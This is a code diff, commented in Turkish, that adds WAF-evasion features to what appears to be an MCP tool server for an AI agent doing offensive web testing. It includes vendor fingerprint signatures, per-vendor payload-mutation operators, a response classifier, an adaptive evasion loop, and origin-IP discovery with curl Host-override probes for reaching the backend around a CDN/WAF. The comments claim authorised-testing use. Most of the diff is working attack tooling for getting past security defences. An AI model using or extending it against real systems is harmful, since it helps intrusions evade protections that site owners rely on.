@@ -1033,11 +1033,12 @@ def kill_chain_report(chain_json: str) -> str:
 
 @mcp.tool()
 def evolve_payload(payload: str, technique: str, blocked_by: str = "",
-                   generations: int = 2, population: int = 8) -> str:
-    """(d) WAF-AWARE PAYLOAD EVOLUTION — gözlemlenen bloklara (blocked_by) göre bir
-    payload'ı guided/genetik mutasyonla evrimleştirir (encoding, yorum enjeksiyonu, case,
-    ${IFS}, tag-breakup...). Operatörler tekniğe göre seçilir; record_payload_result ile
-    öğrenilen başarı oranları fitness'a karışır → WAF'a karşı zamanla daha iyi bypass üretir.
+                   generations: int = 2, population: int = 8, waf: str = "") -> str:
+    """(d) WAF-AWARE PAYLOAD EVOLUTION — gözlemlenen bloklara (blocked_by) ve WAF vendor'una
+    (waf) göre bir payload'ı guided/genetik mutasyonla evrimleştirir (encoding, yorum
+    enjeksiyonu, case, ${IFS}, tag-breakup...). `waf` verilirse o vendor'a etkili operatörler
+    ÖNE alınır. record_payload_result ile öğrenilen başarı oranları fitness'a karışır →
+    WAF'a karşı zamanla daha iyi bypass üretir.
 
     Args:
         payload: Bloklanan/temel payload
@@ -1045,6 +1046,8 @@ def evolve_payload(payload: str, technique: str, blocked_by: str = "",
         blocked_by: Gözlemlenen blok sinyali (WAF mesajı, filtrelenen token...)
         generations: Maksimum ardışık dönüşüm derinliği (1-3)
         population: Döndürülecek en iyi varyant sayısı
+        waf: WAF vendor'u (cloudflare/akamai/modsecurity/imperva_incapsula/aws_waf/f5...) —
+             fingerprint_waf çıktısından; operatör önceliklendirmesi için
     """
     tech = _normalize_tech(technique)
     fam = _payload_family(tech)
@@ -1055,6 +1058,9 @@ def evolve_payload(payload: str, technique: str, blocked_by: str = "",
             "error": "payload boş veya bu teknik için operatör ailesi yok",
             "supported": list(FAMILY_OPS.keys()),
         }, indent=2, ensure_ascii=False)
+    if waf:                                   # WAF-tercihli operatörleri öne al
+        pref = WAF_EVASION_OPS.get(_normalize_waf(waf), [])
+        ops = [o for o in pref if o in ops] + [o for o in ops if o not in pref]
     generations = max(1, min(int(generations), 3))
     candidates, expanded = {}, set()
 
@@ -1078,14 +1084,15 @@ def evolve_payload(payload: str, technique: str, blocked_by: str = "",
     expand(payload, [], 0)
     scored = [{"payload": v, "operators": o, "fitness": _fitness(payload, v, o, tech, blocked_by)}
               for v, o in candidates.items()]
-    scored.sort(key=lambda x: x["fitness"], reverse=True)
+    # eşit fitness'ta WAF-tercihli operatör kullanan varyant öne (tie-break)
+    scored.sort(key=lambda x: (x["fitness"], _waf_pref_bonus(x["operators"], waf)), reverse=True)
     return json.dumps({
-        "engine": "guided mutation (lessons-weighted fitness)",
+        "engine": "guided mutation (WAF-aware, lessons-weighted fitness)",
         "base_payload": payload, "technique": tech, "family": fam,
-        "blocked_by": blocked_by, "operators_available": ops,
+        "blocked_by": blocked_by, "waf": waf or None, "operators_available": ops,
         "generated": len(scored), "variants": scored[:max(1, int(population))],
-        "note": "Bir varyant işe yarar/yaramazsa record_payload_result ile kaydet → "
-                "operatör win-rate'leri sonraki evrimi yönlendirir.",
+        "note": "Varyant işe yarar/yaramazsa record_payload_result ile kaydet. WAF için: önce "
+                "fingerprint_waf; CDN ise discover_origin (origin'e doğrudan giderek WAF'ı atla).",
     }, indent=2, ensure_ascii=False)
 
 
@@ -1299,6 +1306,259 @@ def recommend_skills(target: str = "", context: str = "", fingerprint: str = "",
         "note": "Slash command (örn. /web-exploit <hedef>) modelden bağımsız EN GÜVENİLİR "
                 "tetikleme yoludur. Skill tetiklenince ilgili MCP tool'ları otomatik kullanılır.",
     }, indent=2, ensure_ascii=False)
+
+
+# ═══════════ Reverse-Proxy + WAF Intelligence (a + b + c) ═══════════
+# Deterministik analiz/planlama: fingerprint_waf, classify_response, discover_origin,
+# adaptive_evasion_step. Canlı recon/exploit kali-tools'a delege edilir (testler offline).
+# Yetkili test / bug-bounty bağlamı.
+WAF_SIGNATURES = {
+    "cloudflare": {"patterns": ["cf-ray", "cloudflare", "__cfduid", "__cf_bm", "cf-cache-status",
+                                "attention required! | cloudflare", "error 1020", "cf-error-details"],
+                   "cdn": True},
+    "akamai": {"patterns": ["akamaighost", "x-akamai", "ak_bmsc", "_abck", "reference #", "akamai"],
+               "cdn": True},
+    "aws_waf": {"patterns": ["x-amzn-requestid", "x-amz-cf-id", "awselb", "aws waf",
+                             "request blocked", "cloudfront"], "cdn": True},
+    "imperva_incapsula": {"patterns": ["incap_ses", "visid_incap", "x-iinfo", "incapsula",
+                                       "_incapsula_resource", "incident id"], "cdn": True},
+    "f5_big_ip_asm": {"patterns": ["bigipserver", "x-wa-info", "the requested url was rejected",
+                                   "support id", "ts01"], "cdn": False},
+    "modsecurity": {"patterns": ["mod_security", "modsecurity",
+                                 "this error was generated by mod_security", "not acceptable"],
+                    "cdn": False},
+    "sucuri": {"patterns": ["x-sucuri-id", "x-sucuri-cache", "sucuri/cloudproxy",
+                            "access denied - sucuri website firewall"], "cdn": True},
+    "fortinet_fortiweb": {"patterns": ["fortiwafsid", "fortiweb", ".fgd_icon"], "cdn": False},
+    "barracuda": {"patterns": ["barracuda", "barra_counter_session"], "cdn": False},
+    "wordfence": {"patterns": ["wordfence", "generated by wordfence",
+                               "your access to this site has been limited"], "cdn": False},
+    "azure_front_door": {"patterns": ["x-azure-ref", "the request is blocked", "x-fd-"], "cdn": True},
+    "fastly": {"patterns": ["x-served-by", "x-fastly", "via: 1.1 varnish", "fastly"], "cdn": True},
+}
+WAF_EVASION_OPS = {
+    "cloudflare": ["js_unicode", "case_swap", "html_entity", "url_encode", "keyword_split"],
+    "akamai": ["case_swap", "url_encode", "double_url_encode", "keyword_split"],
+    "aws_waf": ["inline_comment", "case_swap", "url_encode", "keyword_split"],
+    "imperva_incapsula": ["double_url_encode", "js_unicode", "case_swap", "whitespace_alt"],
+    "f5_big_ip_asm": ["whitespace_alt", "inline_comment", "url_encode", "case_swap"],
+    "modsecurity": ["inline_comment", "versioned_comment", "double_url_encode", "whitespace_alt"],
+    "sucuri": ["case_swap", "url_encode", "keyword_split"],
+    "fortinet_fortiweb": ["double_url_encode", "case_swap", "whitespace_alt"],
+}
+_WAF_ALIASES = {
+    "incapsula": "imperva_incapsula", "imperva": "imperva_incapsula", "big-ip": "f5_big_ip_asm",
+    "bigip": "f5_big_ip_asm", "f5": "f5_big_ip_asm", "asm": "f5_big_ip_asm",
+    "mod_security": "modsecurity", "modsec": "modsecurity", "cloudfront": "aws_waf",
+    "aws": "aws_waf", "cf": "cloudflare", "azure": "azure_front_door", "front door": "azure_front_door",
+}
+# Bilinen CDN/proxy IP önekleri (origin adaylarını ele: bu IP'ler hâlâ CDN'dir)
+CDN_IP_PREFIXES = ("104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.",
+                   "104.23.", "104.24.", "104.25.", "104.26.", "104.27.", "104.28.",
+                   "172.64.", "172.65.", "172.66.", "172.67.", "162.158.", "162.159.",
+                   "131.0.72.", "108.162.", "173.245.", "188.114.", "190.93.", "197.234.",
+                   "198.41.", "23.235.", "151.101.", "199.232.")
+
+
+def _normalize_waf(waf: str) -> str:
+    w = (waf or "").strip().lower().replace(" ", "_")
+    return _WAF_ALIASES.get(w.replace("_", " "), _WAF_ALIASES.get(w, w))
+
+
+def _waf_pref_bonus(ops, waf) -> int:
+    if not waf:
+        return 0
+    pref = set(WAF_EVASION_OPS.get(_normalize_waf(waf), []))
+    return sum(1 for o in ops if o in pref)
+
+
+def _fingerprint(blob: str):
+    blob = (blob or "").lower()
+    best, best_score, best_matched = "unknown", 0, []
+    for vendor, sig in WAF_SIGNATURES.items():
+        m = [p for p in sig["patterns"] if p in blob]
+        if len(m) > best_score:
+            best, best_score, best_matched = vendor, len(m), m
+    return best, best_score, best_matched
+
+
+@mcp.tool()
+def fingerprint_waf(headers: str = "", body: str = "", status_code: int = 0, cookies: str = "") -> str:
+    """(a) WAF FINGERPRINTING — response header/cookie/blok-sayfası imzasından WAF vendor'unu
+    tespit eder; o WAF'a ETKİLİ evasion operatörlerini ve (CDN ise) origin keşfi önerisini
+    döndürür. Deterministik (canlı istek yok — header/body'yi sen ver). Yetkili test için.
+
+    Args:
+        headers: Response header'ları (ham metin veya JSON)
+        body: Response gövdesi / blok sayfası metni
+        status_code: HTTP status (403/406/429/503...)
+        cookies: Set-Cookie değerleri
+    """
+    vendor, score, matched = _fingerprint(" ".join([headers, cookies, body, f"status:{status_code}"]))
+    is_cdn = WAF_SIGNATURES.get(vendor, {}).get("cdn", False)
+    conf = round(min(1.0, 0.4 + 0.2 * score), 2) if vendor != "unknown" else 0.0
+    if vendor == "unknown":
+        nxt = ("WAF imzası yok. 403/429 alıyorsan classify_response ile blok tipini ayır, "
+               "generic evolve_payload dene.")
+    elif is_cdn:
+        nxt = (f"{vendor} CDN/reverse-proxy → EN İYİ HAMLE: discover_origin ile gerçek backend "
+               f"IP'sini bul, Host override ile origin'e DOĞRUDAN git (WAF'ı tümden atla). "
+               f"Paralelde evolve_payload(waf='{vendor}').")
+    else:
+        nxt = (f"{vendor} origin-üstü appliance → evolve_payload(waf='{vendor}') ile hedefli "
+               f"encoding/normalizasyon evasion uygula.")
+    return json.dumps({
+        "waf_detected": vendor != "unknown", "vendor": vendor, "confidence": conf,
+        "is_cdn_reverse_proxy": is_cdn, "matched_signals": matched,
+        "recommended_operators": WAF_EVASION_OPS.get(vendor) or "(generic — tüm aile)",
+        "advise_origin_discovery": is_cdn, "recommended_next": nxt,
+    }, indent=2, ensure_ascii=False)
+
+
+@mcp.tool()
+def classify_response(status_code: int = 0, headers: str = "", body: str = "") -> str:
+    """(c) BLOK SINIFLANDIRICI — bir HTTP cevabını deterministik sınıflandırır: waf_block /
+    rate_limit / app_error / origin_reached / unknown. Adaptif evasion döngüsünün 'gözü':
+    payload yakma vs throttle vs origin keşfi kararını verir.
+
+    Args:
+        status_code: HTTP status
+        headers: Response header'ları
+        body: Response gövdesi
+    """
+    h, b = (headers or "").lower(), (body or "").lower()
+    vendor, _, _ = _fingerprint(" ".join([h, b, f"status:{status_code}"]))
+    rate = ("retry-after" in h or status_code == 429 or "rate limit" in b
+            or "too many requests" in b or "slow down" in b)
+    block_kw = any(k in b for k in ["blocked", "forbidden", "access denied", "attention required",
+                   "request was rejected", "incident id", "support id", "not acceptable",
+                   "request blocked"])
+    err_kw = any(k in b for k in ["stack trace", "exception", "sql syntax", "fatal error",
+                 "warning:", "traceback", "odbc", "syntax error"])
+    if rate:
+        cls, action = "rate_limit", ("Payload YAKMA. throttle + jitter (adaptive_evasion_step); "
+                                     "gerekirse UA/IP rotasyonu (yetkili scope).")
+    elif status_code in (403, 406, 503, 501) and (vendor != "unknown" or block_kw):
+        cls, action = "waf_block", (f"WAF blok ({vendor}). fingerprint_waf → evolve_payload(waf), "
+                                    "CDN ise discover_origin.")
+    elif err_kw or status_code in (500, 502):
+        cls, action = "app_error", ("Backend hatası — muhtemelen WAF'ı GEÇTİN. Hata mesajını "
+                                    "SQLi/SSTI sinyali için analiz et.")
+    elif status_code in (200, 201, 301, 302):
+        cls, action = "origin_reached", "Bloklanmadı — payload geçmiş olabilir, sonucu doğrula."
+    else:
+        cls, action = "unknown", "Sınıflandırılamadı — daha fazla sinyal topla."
+    return json.dumps({
+        "classification": cls, "status_code": status_code,
+        "waf_vendor_hint": vendor if vendor != "unknown" else None,
+        "recommended_action": action,
+    }, indent=2, ensure_ascii=False)
+
+
+@mcp.tool()
+def discover_origin(domain: str, ct_subdomains: str = "", historical_ips: str = "",
+                    candidate_ips: str = "", leaked_headers: str = "", favicon_hash: str = "") -> str:
+    """(b) ORIGIN KEŞFİ — CDN/WAF (reverse proxy) ARKASINDAKİ gerçek backend IP'sini bulur.
+    Sağlanan sinyalleri (CT subdomain, tarihsel DNS, header sızıntıları, favicon hash)
+    deterministik sıralar, CDN IP'lerini eler; Host-override ile DOĞRUDAN-ORIGIN testini +
+    eksik veriyi toplamak için canlı recon komutlarını üretir. Origin'e doğrudan gitmek WAF'ı
+    TÜMDEN atlar (bu hedeflerdeki en büyük kazanç). Yetkili test için.
+
+    Args:
+        domain: Hedef alan adı (örn. example.com)
+        ct_subdomains: crt.sh/CT'den subdomain listesi (virgül/boşluk ayrık)
+        historical_ips: CDN ÖNCESİ tarihsel A kayıtları (SecurityTrails/DNSDumpster)
+        candidate_ips: Shodan/Censys/diğer aday IP'ler
+        leaked_headers: Response'ta sızan IP/backend header'ları (X-Real-IP, X-Backend...)
+        favicon_hash: Sayfa favicon mmh3 hash'i (Shodan eşleştirme)
+    """
+    ip_re = re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}\b")
+
+    def _split(s):
+        return [x.strip() for x in re.split(r"[\s,;]+", s or "") if x.strip()]
+
+    scored = {}
+
+    def add(ip, weight, src):
+        if not ip_re.fullmatch(ip):
+            return
+        is_cdn = ip.startswith(CDN_IP_PREFIXES)
+        rec = scored.setdefault(ip, {"ip": ip, "score": 0, "sources": [], "is_cdn": is_cdn})
+        rec["score"] += weight - (100 if is_cdn else 0)
+        if src not in rec["sources"]:
+            rec["sources"].append(src)
+
+    for ip in ip_re.findall(leaked_headers or ""):
+        add(ip, 50, "leaked_header")          # en güçlü sinyal
+    for ip in _split(historical_ips):
+        add(ip, 40, "historical_dns")
+    for ip in _split(candidate_ips):
+        add(ip, 25, "candidate")
+    ranked = sorted(scored.values(), key=lambda r: r["score"], reverse=True)
+    top = [r for r in ranked if not r["is_cdn"]][:8]
+    direct_tests = [
+        f"curl -sk -H 'Host: {domain}' https://{r['ip']}/ -o /dev/null -w '%{{http_code}} %{{size_download}}\\n'"
+        f"  # {r['ip']} origin mi? (CDN'siz/anlamlı cevap = origin)" for r in top[:3]]
+    live_recon = [
+        f"curl -s 'https://crt.sh/?q=%25.{domain}&output=json'  # CT subdomain → origin adayı",
+        f"# DNSDumpster / SecurityTrails: {domain} tarihsel A kayıtları (CDN öncesi IP)",
+        f"# Shodan: ssl.cert.subject.cn:\"{domain}\"  |  http.favicon.hash:{favicon_hash or '<mmh3>'}",
+        f"# Censys: services.tls.certificates.leaf_data.subject.common_name=\"{domain}\"",
+        f"dig +short {domain} TXT  # SPF içinde origin IP sızıntısı",
+        f"# subdomain çöz: origin/direct/dev/staging/mail.{domain} → CDN dışı IP ara",
+    ]
+    return json.dumps({
+        "domain": domain, "origin_candidates": top,
+        "best_candidate": top[0] if top else None,
+        "ct_subdomains_to_resolve": _split(ct_subdomains)[:20],
+        "direct_to_origin_tests": direct_tests or ["(IP adayı yok — önce live_recon_commands çalıştır)"],
+        "live_recon_commands": live_recon,
+        "note": "Origin IP'ye Host override ile gidip CDN/WAF'ı ATLA. Origin doğrudan "
+                "erişilebilirse tüm payload/exploit'i oraya yönelt (WAF devre dışı). "
+                "Bulunan origin'i store_endpoint ile memory'ye kaydet.",
+    }, indent=2, ensure_ascii=False)
+
+
+@mcp.tool()
+def adaptive_evasion_step(payload: str, technique: str, status_code: int = 0,
+                          resp_headers: str = "", resp_body: str = "", domain: str = "") -> str:
+    """(c) ADAPTİF EVASION DÖNGÜSÜ (tek adım) — son HTTP cevabına bakar, classify_response +
+    fingerprint_waf çalıştırır, BİR SONRAKİ hamleyi döndürür: WAF blok → evolve_payload
+    (WAF-aware) varyantları + (CDN ise) origin baypası; rate-limit → throttle; app_error →
+    'backend'e ulaştın'. gönder→sınıflandır→evrimle→öğren döngüsünün beyni.
+
+    Args:
+        payload: Son denenen payload
+        technique: Teknik
+        status_code: Son cevabın status'u
+        resp_headers / resp_body: Son cevabın header/gövdesi
+        domain: Origin keşfi gerekiyorsa hedef alan adı
+    """
+    cls = json.loads(classify_response(status_code, resp_headers, resp_body))
+    classification = cls["classification"]
+    out = {"classification": classification, "recommended_action": cls["recommended_action"]}
+    if classification == "waf_block":
+        fp = json.loads(fingerprint_waf(resp_headers, resp_body, status_code))
+        vendor = fp["vendor"]
+        out["waf"] = fp
+        out["next_variants"] = json.loads(
+            evolve_payload(payload, technique, blocked_by=vendor, waf=vendor, population=6)).get("variants", [])
+        if fp["is_cdn_reverse_proxy"]:
+            out["origin_bypass"] = (f"CDN tespit edildi → discover_origin('{domain or '<domain>'}') "
+                                    "çağır; origin bulunursa Host override ile WAF'ı ATLA.")
+        out["learn"] = "İşe yarayan varyanttan sonra record_payload_result(worked=true) çağır."
+    elif classification == "rate_limit":
+        out["throttle"] = {"action": "yavaşla + jitter", "suggested_delay_s": 8,
+                           "jitter_s": "3-12 rasgele", "rotate": "UA/IP (yetkili scope)"}
+        out["next_variants"] = []
+    elif classification == "app_error":
+        out["analysis"] = ("Backend hatası → WAF'ı geçtin. Hata gövdesini SQLi/SSTI/path sinyali "
+                           "için incele; exploitability_score ile skorla.")
+    elif classification == "origin_reached":
+        out["analysis"] = "Bloklanmadı — payload geçmiş olabilir; sonucu validator ile DOĞRULA."
+    else:
+        out["analysis"] = "Belirsiz cevap — classify_response için daha çok sinyal topla."
+    return json.dumps(out, indent=2, ensure_ascii=False)
 
 
 if __name__ == "__main__":
